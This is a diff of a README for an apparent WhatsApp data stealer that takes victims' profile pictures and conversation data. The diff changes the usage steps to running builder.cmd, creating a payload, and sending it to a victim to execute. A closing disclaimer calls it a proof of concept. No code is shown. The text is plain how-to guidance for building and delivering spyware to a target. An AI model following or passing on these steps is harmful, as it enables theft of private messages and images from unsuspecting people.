@@ -23,8 +23,8 @@ This program steal the victim's WhatsApp data such as profile pictures of conver
 ## How to use 📖
 
 * Download this repository
-* Make sure you have python and the requirements installed (pip install -r requirements.txt)
-* Start main.py 
+* Make sure you have python installed
+* Start builder.cmd
 * Create a payload (the program will ask you if you wanna compile the payload)
 * Send the payload to your victim and make it execute it
 * Don't forget this is a POC and that this shouldn't be used for malicious purposes, i'm not responsible for your actions
